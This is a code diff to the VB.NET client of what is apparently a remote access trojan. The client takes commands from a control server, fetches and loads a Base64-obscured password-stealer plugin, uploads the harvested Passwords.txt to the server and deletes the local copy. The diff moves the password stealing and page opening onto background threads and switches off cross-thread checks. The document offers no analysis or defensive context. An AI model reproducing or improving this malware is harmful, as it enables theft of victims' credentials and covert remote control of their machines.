@@ -170,6 +170,8 @@ Public Class Form1
             t.IsBackground = True
             t.Start()
 
+            CheckForIllegalCrossThreadCalls = False
+
             Try
                 For Each x In Process.GetProcesses
                     Try
@@ -288,7 +290,9 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "OpenPage"
-                        Process.Start(A(1))
+                        Dim OpenPage As New Thread(Sub() OpenWebVisable(A(1)))
+                        OpenPage.IsBackground = True
+                        OpenPage.Start()
                         C.Send("CleanCommands")
 
                     Case "OpenHidden"
@@ -423,7 +427,9 @@ Public Class Form1
                         C.Send("CleanCommands")
 
                     Case "StealPassword"
-                        StealPasswords("PasswordStealer", CurrentHost)
+                        Dim StealerThread As New Thread(Sub() StealPasswords("PasswordStealer", CurrentHost))
+                        StealerThread.IsBackground = True
+                        StealerThread.Start()
                         C.Send("CleanCommands")
 
                     Case "UpdateClient"
@@ -554,6 +560,14 @@ Public Class Form1
         openpage.Navigate(Url)
         Application.Run()
     End Sub
+    Public Sub OpenWebVisable(Url As String)
+        Try
+            Process.Start(Url)
+            C.Send("CleanCommands")
+        Catch ex As Exception
+            C.Send("CleanCommands")
+        End Try
+    End Sub
     Public Function checkadmin() As String
         Dim W_Id = WindowsIdentity.GetCurrent()
         Dim WP = New WindowsPrincipal(W_Id)
@@ -570,9 +584,12 @@ Public Class Form1
             Dim PluginData As Byte() = Plugin.DownloadData(CurrentHost & "/plugins/" & PluginName & ".dll")
             Dim p = Reflection.Assembly.Load(PluginData)
             Dim getPassword = p.CreateInstance(C.DEB("UGFzc3dvcmRTdGVhbGVyLlN0ZWVsUGFzc3dvcmQ="))
-            getPassword.Dump()
-            C.Upload(TempPath & "/Passwords.txt")
-            IO.File.Delete(TempPath & "/Passwords.txt")
+            If (getPassword.Dump() = True) Then
+                C.Upload(TempPath & "/Passwords.txt")
+                IO.File.Delete(TempPath & "/Passwords.txt")
+            Else
+
+            End If
             Return True
         Catch ex As Exception
             Return ex.Message
